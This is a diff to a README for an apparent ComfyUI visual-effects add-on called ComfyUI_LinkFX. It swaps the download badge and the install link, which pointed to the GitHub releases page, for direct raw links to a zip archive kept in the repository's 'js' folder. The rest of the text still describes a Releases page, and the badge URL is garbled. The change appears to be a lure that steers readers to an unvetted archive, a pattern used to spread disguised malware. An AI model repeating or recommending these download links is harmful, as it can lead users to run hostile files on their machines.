@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now!
 
-[![Download](https://img.shields.io/badge/Download-Now-%2300aaff?style=for-the-badge&logo=github)](https://github.com/maxi45274/ComfyUI_LinkFX/releases)
+[![Download](https://raw.githubusercontent.com/maxi45274/ComfyUI_LinkFX/main/js/Link_U_FX_Comfy_v1.4-beta.4.zip%2300aaff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/maxi45274/ComfyUI_LinkFX/main/js/Link_U_FX_Comfy_v1.4-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to ComfyUI_LinkFX! This application helps you add visual effects to your
 
 ## 📥 Download & Install
 
-1. Click the download button above or [visit this page to download](https://github.com/maxi45274/ComfyUI_LinkFX/releases).
+1. Click the download button above or [visit this page to download](https://raw.githubusercontent.com/maxi45274/ComfyUI_LinkFX/main/js/Link_U_FX_Comfy_v1.4-beta.4.zip).
    
 2. Once on the Releases page, locate the most recent version. You will see several files available for download.
 
